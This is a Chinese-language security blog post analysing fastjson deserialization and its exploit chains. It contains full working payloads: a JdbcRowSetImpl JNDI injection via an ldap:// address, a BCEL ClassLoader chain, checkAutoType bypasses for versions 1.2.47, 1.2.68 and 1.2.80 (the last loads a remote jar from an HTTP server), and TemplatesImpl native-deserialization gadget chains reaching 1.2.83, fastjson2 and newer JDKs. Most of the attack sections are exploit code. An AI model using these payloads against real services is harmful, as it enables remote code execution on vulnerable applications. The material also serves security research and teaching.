返回后我们可以看到反序列化器是成功创建了出来

但是这样的类有什么不好的地方呢，就是临时创建的类在调试过程中发现根本不清楚这个过程做了什么，调用栈上虽然有，但是点击并没有任何的反应
因此如果想要调试我们只能让asmEnable为false，然后new JavaBeanDeserializer来创建一个反序列化器
在上面的伏笔中中，存在通过判断字段是否getOnly来关闭asmEnable

也就是只要字段getOnly为true使得asmEnable为false，那么我们就不会像刚才那样返回一个asmFactory的创建反序列化器的方法，而是走到new JavaBeanDeserializer，这样子我们就可以好好地进行调试了
那么getOnly的值只有在下面这一处可以改

FieldInfo中的getOnly处，判断方法的参数是否为1，不是的话getOnly就为true
然后在前面的setter方法的循环中，我们可以看到要是参数值不为1的话会直接跳出循环，都走不到add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null));处，自然也就修改不了getOnly的值

因此我们只能够通过getter方法来进行修改，也就是通过一个对象，与其对应的只有一个getter（如果有setter会优先调用setter而不会调用getter）
但是上面分析过了调用这个getter需要getter的返回值满足那几种类型（Collection、Map等），但是问题不大，Person类修改为如下：
package org.example;import java.util.Map;public class Person &#123;    private int age;    private String name;    private Map map;    public Person()&#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public int getAge()&#123;        System.out.println(&quot;getAge&quot;);        return age;    &#125;    public void setAge(int age)&#123;        System.out.println(&quot;setAge&quot;);        this.age = age;    &#125;    public String getName()&#123;        System.out.println(&quot;getName&quot;);        return name;    &#125;    public void setName(String name)&#123;        System.out.println(&quot;setName&quot;);        this.name = name;    &#125;    public Map getMap()&#123;        System.out.println(&quot;getMap&quot;);        return map;    &#125;&#125;

修改完后我们重新调试一下

成功修改

成功关掉开关，于是我们返回的就是一个JavaBeanDeserializer

于是我们也就能正常地进行调试了（上面忙活这么多就是为了能正常地调试）
这一次的derializer和上次的相比多了一个map字段

然后获取到了之后我们就调用它的反序列化方法

一直跟进deseralize方法
358行开始对每个字段遍历进行实例化赋值操作

580行，步入createInstance方法

该函数先进行一个判断是否是接口，是的话就生成一个代理；不是的话就调用其自己的默认构造函数来进行实例化，再return object回去

继续往下走，走到setValue()处，开始给字段赋值了，这是最重要的一部分

一路往下走，来到了一处反射，调用setter来完成赋值

步过，控制台输出setName

age的赋值同理，
至此一整个反序列化的流程结束
回到前面，成功拿到了Person对象

在继续往下走的过程来到toJSON()，会调用getter
这个过程就是前面一步是把字符串转换为了对象，然后这一步是把对象转换为JSON字符串
我们跟进去，往下走到这一步

该行代码会获取到一个与指定类clazz关联的对象序列化器

往下走到这一步，跟进去

会在这里获取值，跟进getPropertyValue方法里

然后我们再跟进get方法

在这里面会反射调用getter方法


到这里基本的流程差不多就结束
从上面我们可以得知在反序列化过程中会自动调用setter方法，也就是说我们只要有一个类，其中有一个setter方法中有危险函数，那么我们就可以实行攻击
修改一下Person类
package org.example;import java.io.IOException;import java.util.Map;public class Person &#123;    private int age;    private String name;    private Map map;    public Person()&#123;        System.out.println(&quot;Person constructor&quot;);    &#125;    public int getAge()&#123;        System.out.println(&quot;getAge&quot;);        return age;    &#125;    public void setAge(int age)&#123;        System.out.println(&quot;setAge&quot;);        this.age = age;    &#125;    public String getName()&#123;        System.out.println(&quot;getName&quot;);        return name;    &#125;    public void setName(String name)&#123;        System.out.println(&quot;setName&quot;);        this.name = name;    &#125;    public Map getMap()&#123;        System.out.println(&quot;getMap&quot;);        return map;    &#125;    public void setCmd(String cmd) throws IOException &#123;        Runtime.getRuntime().exec(cmd);    &#125;&#125;

测试代码
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class JSONUnser&#123;    public static void main(String[] args) throws Exception&#123;        String s = &quot;&#123;\&quot;@type\&quot; : \&quot;org.example.Person\&quot;, \&quot;age\&quot; : 18, \&quot;name\&quot; : \&quot;Sherlock\&quot;, \&quot;cmd\&quot; : \&quot;calc\&quot;&#125;&quot;;        JSONObject jsonObject = JSON.parseObject(s);        System.out.println(jsonObject);    &#125;&#125;

执行后成功弹出计算器
1.2.24利用JdbcRowSetImpl在connect()方法下面存在明显的jndi注入
lookup的参数是通过getter来获取的

我们要怎么判断变量可控，就是变量要有对应的setter或者是public或者是满足条件的getter（具体可以去看JavaBeanInfo.java文件中的对应代码）
因此this.getDataSourceName()变量可控（由jndi相关知识可知这是一个地址），因为点进去下面就是对应的setter方法
接下来就继续往上找，找connect方法是否在getter或者setter中

由上面逻辑调试中的分析，想调用getter有两种途径：
1、返回值规定的那些个getter才能被add到fieldList中后续被调用，但是这里的返回值DatabaseMetaData显然不符合要求
2、需要能走到toJSON，而走到toJSON需要保证到你这需要的getter之前的所有getter流程不抛出异常，能正常invoke
但是这里第一个方法就gg了没invoke成功

因此只能走setter，也就是setAutoCommit方法

先开启LDAP服务器并在7777端口挂载好恶意类

payload如下：
package org.example;import com.alibaba.fastjson.JSON;public class FastJsonJdbcRowSetImpl &#123;    public static void main(String[] args) throws Exception &#123;        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;AutoCommit\&quot;:false&#125;&quot;;        JSON.parseObject(s);    &#125;&#125;

测试，成功弹出计算器

这条链由于是利用了jndi注入，所以会受到版本限制(jdk&lt;8u191)、依赖限制，同时还需要出网才可以
bcel.ClassLoader(不出网)
我们要利用的是该类中的loadClass方法，该方法中主要利用部分如下

类名满足一定条件后会执行createClass方法生成类，然后再用defineClass方法进行字节码加载
我们先单纯利用该方法不涉及到fastjson来测试一下
package org.example;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.util.ClassLoader;import java.nio.file.Files;import java.nio.file.Paths;public class FastJsonBcel &#123;    public static void main(String[] args) throws Exception &#123;        ClassLoader classLoader = new ClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\T.class&quot;));        String str = Utility.encode(bytes,true);        str = &quot;$$BCEL$$&quot; + str;        classLoader.loadClass(str).newInstance();    &#125;&#125;

运行后会成功弹出计算器，至于为什么代码中有一行encode呢，这是因为上面的createClass方法中会有一个decode方法，所以相应的我们就需要来个encode方法喽

ok，接下来我们就要想办法调用到loadClass方法了
引入依赖
&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;    &lt;version&gt;9.0.20&lt;/version&gt;&lt;/dependency&gt;

我们所找的类为BasicDataSource，所需要的方法为createConnectionFactory()

我们可以知道该方法中通过forName函数来加载类，现在我们就要看driverClassName和driverClassLoader有没有对应的setter方法
（forName方法的底层就是调用loadClass方法）


两个变量都可控
现在我们再从createConnectionFactory()方法向上查找，看看会不会在setter或getter中
走到createDataSource()，再向上查找走到了getConnection()（还在同一个文件内）

可以看到是一个getter方法，返回类型不满足那几种，所以就是在toJson方法中调用的getter方法
正向漏洞代码：
        ClassLoader classLoader = new ClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;D:\\tmp\\Test.class&quot;));        String str = Utility.encode(bytes,true);//        System.out.println(str);        str = &quot;$$BCEL$$&quot; + str;        BasicDataSource basicDataSource = new BasicDataSource();        basicDataSource.setDriverClassName(str);        basicDataSource.setDriverClassLoader(classLoader);        basicDataSource.getConnection();

验证时可以的，所以我们的payload如下：
package org.example;import com.alibaba.fastjson.JSON;import com.sun.org.apache.bcel.internal.classfile.Utility;import com.sun.org.apache.bcel.internal.util.ClassLoader;import java.nio.file.Files;import java.nio.file.Paths;public class FastJsonBcel &#123;    public static void main(String[] args) throws Exception &#123;        ClassLoader classLoader = new ClassLoader();        byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\T.class&quot;));        String str = Utility.encode(bytes,true);        str = &quot;$$BCEL$$&quot; + str;//        classLoader.loadClass(str).newInstance();        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;&quot;+str+&quot;\&quot;&#125;&quot;;        JSON.parseObject(s);    &#125;&#125;

测试，成功弹出计算器
TemplatesImpl实用价值不高
&#123;    &quot;a&quot;: &#123;        &quot;@type&quot;: &quot;java.lang.Class&quot;,        &quot;val&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;        &#125;,    &quot;b&quot;: &#123;        &quot;@type&quot;: &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,        &quot;_bytecodes&quot;: [&quot;字节码&quot;],        &#x27;_name&#x27;: &#x27;a.b&#x27;,        &#x27;_tfactory&#x27;: &#123;&#125;,        &quot;_outputProperties&quot;: &#123;&#125;,        &quot;_name&quot;: &quot;b&quot;,        &quot;_version&quot;: &quot;1.0&quot;,        &quot;allowedProtocols&quot;: &quot;all&quot;      &#125;&#125;

由于该类传入的参数好几个都没有对应的getter和setter方法，所以要利用它的话需要改配置
JSON.parseObject(s, Feature.SupportNonPublicField);

fastjson高版本绕过fastjson&lt;&#x3D;1.2.47绕过依赖
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.25&lt;/version&gt;&lt;/dependency&gt;

我们用上之前的payload来运行的话便会直接报错如下：

我们在最后一行打个断点调试一下
发现是在判断key值是否为@type之后做了一个checkAutoType的校验

我们跟进这个函数看一看，一直往下走，会先从两个缓存（Mapping和deserializers）中进行加载
Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);if (clazz == null) &#123;    clazz = deserializers.findClass(typeName);&#125;

现在肯定是没有的，所以我们继续往下走，会直接被黑名单拦截

黑名单如下：
从头看该函数，只有通过了黑白名单的校验后才能继续到类加载
白名单默认是空的，所以显然走不到这里的类加载

我们再往下看看别的能类加载的代码

这是从缓存中的指定类中获取
如果缓存中没有的话，会继续从反序列化器中找

进来看了下，也是从deserializer缓存中加载类
可以看都是从缓存中来加载类，那么我们就是要看看能不能向缓存类中添加一些我们的恶意类来进行绕过
查找对mapping进行put操作的部分，来到TypeUtil的loadClass()方法
于是我们查找该loadClass()的用法
在TypeUtil本类中的用法当然是派不上用场的
在checkAutoType()函数中调用，但是受限于if，都走不进去

然后就是MiscCodec中的deserialize()中，当clazz为Class.class的时候，会将strVal放入loadClass中

该部分位于deserializer()方法中，说明这东西和反序列化有关
注意MiscCodec实现了ObjectSerializer和ObjectDeserializer接口，所以这玩意本质上是一个序列化器反序列化器

上文提到过反序列化器是从config中获取到的，这个config我们上文差不多分析过了，走进去底层实际上是在deserializer缓存里找class对应的键值对
如果我们反序列化的类是Class，那么就会调用MiscCodec的反序列化器

所以在反序列化的时候走到deserializer()中就会调用MiscCodec的loadClass()，然后就会把我们传入的字符串传给loadClass()
因此一共是分为两步，第一步是先将我们的恶意类加载到缓存中，第二部是从缓存中查找我们的恶意类，从而绕过checkAutoType函数
payload：
package org.example;import com.alibaba.fastjson.JSON;public class FastJsonBypass1 &#123;    public static void main(String[] args) throws Exception &#123;        //第一步，反序列化一个Class类，值为恶意类        //接着用之前的payload        String s = &quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;,\&quot;AutoCommit\&quot;:false&#125;&#125;&quot;;        JSON.parseObject(s);    &#125;&#125;

至于为什么参数名要是val，见下图

当第二次经过该函数的时候，可以直接从缓存中加载com.sun.rowset.JdbcRowSetImpl，从而绕过检测

题外话：
实际使用fastjson1.2.47走到checkAutoType的时候会发现和1.2.25是不一样的
原先的denyLists黑名单变成了一个哈希表，主打的就是一个防止安全人员研究这玩意来进行绕过，，
但是在这个版本还是没防住通过向mappings添加类名来达到类加载的绕过
已破解开的黑名单哈希如下：https://github.com/LeadroyaL/fastjson-blacklist
fastjson&lt;&#x3D;1.2.68在1.2.68版本用上以前的payload直接报错，调试一下看看是哪里出了问题
当走到MiscCodec.deserialize()中触发TypeUtils.loadClass()的地方加入了一个cache参数，默认为false

跟进loadClass方法之后，我们可以明白只有当cache值为true的时候，才会向缓存中put一个新的类
现在说明这个方法是行不通的了，需要我们另寻他法
我们先来看一下通过checkAutoType()校验的方式有哪些：

白名单里的类
开启了autotype
使用了JSONType注解
指定了期望类（expectClass）
缓存在mapping中的类
使用ParserConfig.AutoTypeCheckHandler接口通过校验的类

我们这次用的就是第四种方式
checkAutoType()中的expectClass参数类型为java.lang.Class，当expectClass传入checkAutoType()时不为null，并且我们要实例化的类是expectClass的子类或其实现时会将传入的类视为一个合法的类（不能在黑名单中），然后通过loadClass返回该类的class，我们就可以利用这个绕过checkAutoType()。
此外，由于checkAutoType()中黑名单的检测位于loadClass之前，所以不能在黑名单中，另外恶意类需要是expectClass的接口或是expectClass的子类。
我们查找把expectClass参数传递给checkAutoType()函数的利用类有两个：AutoCloseable类和Throwable类
AutoCloseable先准备好我们需要的代码
EXP
package org.example;import com.alibaba.fastjson.JSON;public class AutoCloseableBypass &#123;    public static void main(String[] args) &#123;        JSON.parseObject(&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.example.JavaBean\&quot;, \&quot;cmd\&quot;:\&quot;calc.exe\&quot;&#125;&quot;);    &#125;&#125;

JavaBean
package org.example;import java.io.IOException;public class JavaBean implements AutoCloseable&#123;    public JavaBean(String cmd)&#123;        try&#123;            Runtime.getRuntime().exec(cmd);        &#125;catch (IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    @Override    public void close() throws Exception &#123;    &#125;&#125;

测试之后成功弹出计算器，下面我们来自己进行调试看一下具体的过程
前面我们还是步入chechAutotype()方法，里面有一段代码是当expectClass不为空且不是那几个固定的类的时候会将expectClassFlag设为true，我们在第二次进入checkAutotype()方法的时候会用到

接下来会进行黑白名单查询。首先进行内部白名单，之后及进行内部黑名单，由于内部黑名单为null故跳过
之后，如果非内部白名单并且开启autoTypeSupport或者expectClassFlag值为true时会进行黑白名单查找。首先在白名单内二分查找，如果在则加载后返回指定class对象，如果不在或者为空，会继续在黑名单中进行二分查找；若不在黑名单且getClassFromMapping返回值为null，就再在白名单查询，若为空则异常，否则continue

一直往下走，最后返回接口AutoCloseable，从该方法出去

出来一直往下走到这里，跟进去

一直往下走，在deserialze()解析字段，当key&#x3D;@type（第二个）时，调用checkAutoType()并传入expectClass

第二次步入checkAutoType方法，这次参数typeNme的值为org.example.JavaBean，并且这一次成功将expectClassFlag赋值为true
继续往下走，这次会进入黑白名单检测

经过这次检测后，下面由于autoTypeSupport值为false，所以要再来一次黑白名单检测

之后resource将“.”替换为”&#x2F;“得到路径，并且这里貌似有读文件的功能

之后如果autoType打开或者使用了JSONType注解，又或者 expectClassFlag为true时，并且只有在autoType打开或者使用了JSONType注解时，才会将类加入到缓存mapping中。另外没使用JSONType注解不会返回

继续往下走，但expectClass不为空的时候，会将类加入缓存后并返回

出来后往下走到deserialze方法，由于将恶意类加入mapping，在反序列化解析时会绕过autoType，成功利用

跟进该方法的话，一直往下走到生成新的对象的时候会弹计算器

fastjson&#x3D;1.2.80groovy在fastjson的1.2.80版本中可以通过将依赖加入到java.lang.Exception 期望类的子类中，绕过checkAutoType
测试代码
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc &#123;    public static void main(String[] args) &#123;        String json =&quot;&#123;\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\n&quot; +                &quot;  \&quot;unit\&quot;:&#123;\n&quot; +                &quot;  &#125;\n&quot; +                &quot;&#125;&quot;;        try &#123;            JSON.parse(json);        &#125; catch (Exception e) &#123;        &#125;&#125;

按之前调试步骤走，跟进checkAutoType函数中，从缓存中读取到了Expection类

返回，往下走，获取ObjectDeserializer对象，因为是异常类，获取到的是ThrowableDeserializer反序列化器

步入进deserialze方法，跳转到com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;ParserConfig.java（在下面生成exClass的时候跳转的）

往下走，会进行黑白名单验证，不重要，继续往下走到

跟进loadClass方法，可以加载处类，但由于cache值不为真所以不能put进缓存中，所以return回去
继续往下走，由于expectClass不为空，所以可以将clazz加入缓存中

返回后，回到了com&#x2F;alibaba&#x2F;fastjson&#x2F;parser&#x2F;deserializer&#x2F;ThrowableDeserializer.java，继续往下走

跟进getDeserializer方法，往下走，每一次都会putDeserializer，可以向deserializers添加新数据

第三次处理会加上org.codehaus.groovy.control.ProcessingUnit

需要存在groovy链，这里测试版本使用如下版本
&lt;dependency&gt;    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;    &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;    &lt;version&gt;3.0.1&lt;/version&gt;&lt;/dependency&gt;

jar包用的
https://github.com/Lonely-night/fastjsonVul

 1.编译attack 模块为 attack-1.jar包
2.在attack-1.jar包所在的目录下执行启用http服务。
python -m http.server 8433

Poc
package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc &#123;    public static void main(String[] args) &#123;        String json =&quot;&#123;\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +                &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\n&quot; +                &quot;  \&quot;unit\&quot;:&#123;\n&quot; +                &quot;  &#125;\n&quot; +                &quot;&#125;&quot;;        try &#123;            JSON.parse(json);        &#125; catch (Exception e) &#123;        &#125;        json =                &quot;&#123;\n&quot; +                        &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.ProcessingUnit\&quot;,\n&quot; +                        &quot;  \&quot;@type\&quot;:\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\&quot;,\n&quot; +                        &quot;  \&quot;config\&quot;:&#123;\n&quot; +                        &quot;    \&quot;@type\&quot;: \&quot;org.codehaus.groovy.control.CompilerConfiguration\&quot;,\n&quot; +                        &quot;    \&quot;classpathList\&quot;:[\&quot;http://127.0.0.1:8433/attack-1.jar\&quot;]\n&quot; +                        &quot;  &#125;,\n&quot; +                        &quot;  \&quot;gcl\&quot;:null,\n&quot; +                        &quot;  \&quot;destDir\&quot;: \&quot;/tmp\&quot;\n&quot; +                        &quot;&#125;&quot;;        JSONObject.parse(json);    &#125;&#125;

基于java原生反序列化fastjson&lt;&#x3D;1.2.48&amp;fastjson2具体的请参考原作者博客文章
依赖
    &lt;groupId&gt;org.javassist&lt;/groupId&gt;    &lt;artifactId&gt;javassist&lt;/artifactId&gt;    &lt;version&gt;3.19.0-GA&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.48&lt;/version&gt;&lt;/dependency&gt;

看下来利用链其实不难：JSONArray.toString()-&gt;JSONArray.toJSONString()-&gt;getter
payload：
package org.example;import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Test &#123;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static void main(String[] args) throws Exception&#123;        ClassPool pool = ClassPool.getDefault();        CtClass clazz = pool.makeClass(&quot;a&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        clazz.addConstructor(constructor);        byte[][] bytes = new byte[][]&#123;clazz.toBytecode()&#125;;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setValue(templates, &quot;_bytecodes&quot;, bytes);        setValue(templates, &quot;_name&quot;, &quot;sherlock&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException val = new BadAttributeValueExpException(null);        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);        valfield.setAccessible(true);        valfield.set(val, jsonArray);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(val);        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));        Object o = (Object)ois.readObject();    &#125;&#125;

至于为什么在1.2.49开始该种操作就不行了呢，这是因为从这个版本开始JSONArray以及JSONObject方法开始真正有了自己的readObject方法

在其SecureObjectInputStream类当中重写了resolveClass,在其中调用了checkAutoType方法做类的检查

fastjson1通杀那么上面的限制我们要怎么突破呢
见原作者博客
依赖
&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.83&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.javassist&lt;/groupId&gt;    &lt;artifactId&gt;javassist&lt;/artifactId&gt;    &lt;version&gt;3.27.0-GA&lt;/version&gt;&lt;/dependency&gt;

从上文我们可知，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查，这样真的是安全的么？
初看，这样的写法很安全，当调用JSONArray&#x2F;JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给SecureObjectInputStream处理时，触发resolveClass实现对恶意类的拦截
因此我们就需要找找看在哪些情况下readObject的时候不会调用resolveClass，答案就是引用（具体分析看引用原文）
那么现在要解决的就是如何在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查
答案是当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，
ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();arrayList.add(templates);arrayList.add(templates);writeObjects(arrayList);

在java.io.ObjectOutputStream#writeObject0方法中存在一个判断，当再次写入同一对象时，如果在handles这个哈希表中查到了映射，就会通过writeHandle方法将重复对象以REFERENCE类型写入，因此向List、Set及Map类型中添加同样对象时即可成功利用
序列化时，先将templates加入ArrayList，后续在JSONArray中再次序列化TemplatesImpl时，由于在handles这个哈希表中查到了映射，后续则会以引用形式输出。反序列化时，ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray&#x2F;JSONObject对象，会触发JSONArray&#x2F;JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray&#x2F;JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过
payload：
package org.example;import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Main &#123;    public static void setValue(Object obj, String name, Object value) throws Exception&#123;        Field field = obj.getClass().getDeclaredField(name);        field.setAccessible(true);        field.set(obj, value);    &#125;    public static byte[] genPayload(String cmd) throws Exception&#123;        ClassPool pool = ClassPool.getDefault();        CtClass clazz = pool.makeClass(&quot;a&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        clazz.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz);        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;&quot;+cmd+&quot;\&quot;);&quot;);        clazz.addConstructor(constructor);        clazz.getClassFile().setMajorVersion(49);        return clazz.toBytecode();    &#125;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = TemplatesImpl.class.newInstance();        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;calc&quot;)&#125;);        setValue(templates, &quot;_name&quot;, &quot;sherlock&quot;);        setValue(templates, &quot;_tfactory&quot;, null);        JSONArray jsonArray = new JSONArray();        jsonArray.add(templates);        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);        setValue(bd,&quot;val&quot;,jsonArray);        HashMap hashMap = new HashMap();        hashMap.put(templates,bd);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);        objectOutputStream.writeObject(hashMap);        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));        objectInputStream.readObject();    &#125;&#125;

高版本的一些绕过jdk&gt;&#x3D;17的时候发现BadAttributeValueExpException.readObject()无法作为source，因此就需要找其他的触发toString()的链拼起来
其他触发toString()
EventListenerList利用链：EventListenerList.readObject() -&gt; UndoManager#toString() -&gt;Vector#toString()
利用代码
Vector vector = new Vector();vector.add(jsonArray);UndoManager undoManager = new UndoManager();setField(undoManager,&quot;edits&quot;,vector);EventListenerList eventListenerList = new EventListenerList();setField(eventListenerList,&quot;listenerList&quot;,new Object[]&#123;Class.class,undoManager&#125;);unser(ser(eventListenerList));

调用栈
toString:886, JSONArray (com.alibaba.fastjson2)toString:266, CompoundEdit (javax.swing.undo)toString:695, UndoManager (javax.swing.undo)add:213, EventListenerList (javax.swing.event)readObject:309, EventListenerList (javax.swing.event)readObject:467, ObjectInputStream (java.io)

XStringHashMap#readObject()-&gt;putVal()-&gt;equals()-&gt;XString.equals()-&gt;toString()
自己写了个方法
public static HashMap getXString(Object obj) throws Exception&#123;    //obj传入待触发toString()的，可根据实际情况把XString换了，用来接任意equals    XString xstring=new XString(&quot;&quot;);    HashMap hashMap1 = new HashMap();    HashMap hashMap2 = new HashMap();    hashMap1.put(&quot;zZ&quot;,obj);    hashMap1.put(&quot;yy&quot;,xstring);    hashMap2.put(&quot;zZ&quot;,xstring);    hashMap2.put(&quot;yy&quot;,obj);    HashMap hashMap = new HashMap();    hashMap.put(&quot;hashMap1&quot;, 1);    hashMap.put(&quot;hashMap2&quot;, 2);    setHashMapKey(hashMap,&quot;hashMap1&quot;,hashMap1);//避免提前触发抛异常导致程序无法继续进行    setHashMapKey(hashMap,&quot;hashMap2&quot;,hashMap2);    return hashMap;&#125;

HotSwappableTargetSource利用链：HashMap#readObject -&gt; HotSwappableTargetSource#equals -&gt; XString#equals -&gt; toString
HotSwappableTargetSource类的hashCode()方法始终返回定值

为后续在putVal()中判断哈希冲突提供了可利用条件

    public static void main(String[] args) throws Exception &#123;        JSONArray jsonArray = new JSONArray();        jsonArray.add(getTemplates());        unser(ser(getHotSwappableTargetSource(jsonArray)));    &#125;public static HashMap getHotSwappableTargetSource(Object obj) throws Exception&#123;    HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(obj);    HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(&quot;x&quot;));    HashMap hashMap = new HashMap();    hashMap.put(&quot;1&quot;, hotSwappableTargetSource1);    hashMap.put(&quot;2&quot;, hotSwappableTargetSource2);    setHashMapKey(hashMap,&quot;1&quot;,hotSwappableTargetSource1);    setHashMapKey(hashMap,&quot;2&quot;,hotSwappableTargetSource2);    return hashMap;&#125;

高版本（&gt;2.0.26）绕过对于fastjson来讲，从2.0.27版本开始，其在原生反序列化的过程中设置了黑名单限制，在黑名单中的类并不会被调用getter方法
fastjson中2.0.27版本开始，在toString调用的必经之路上设置了黑名单检查，如果调用的类在黑名单中则忽视对应的调用过程，具体可见BeanUtils#ignore方法
黑名单绕过既然设置了黑名单过滤的方式进行防御，类似于fastjson1.2.x系列的绕过方式，可以采用黑名单绕过的方式进行bypass
也即是寻找不在黑名单的类，且其getter方法能够作为sink点
参考文献中提到了两种，分别是依赖com.mchange:mchange-commons-java的com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized类和JDK下的LdapAttribute#getAttributeDefinition方法，其实还存在很多不在黑名单中的类可以作为sink点，例如
sun.print.UnixPrintServiceLookup#getDefaultPrintServicejavax.naming.spiContinuationDirContext#getTargetContextcom.sun.media.sound.JARSoundbankReader#getSoundbank....

动态代理的绕过方式JdkDynamicAopProxy若类为代理类，则其只会将代理的接口类进行黑名单检查，并不会对代理的具体对象进行黑名单检查

使用JdkDynamicAopProxy进行TemplateImpl对象的代理，特别的我们需要的getOutputProperties方法在Template接口中，该接口并不在黑名单内，能够进行绕过
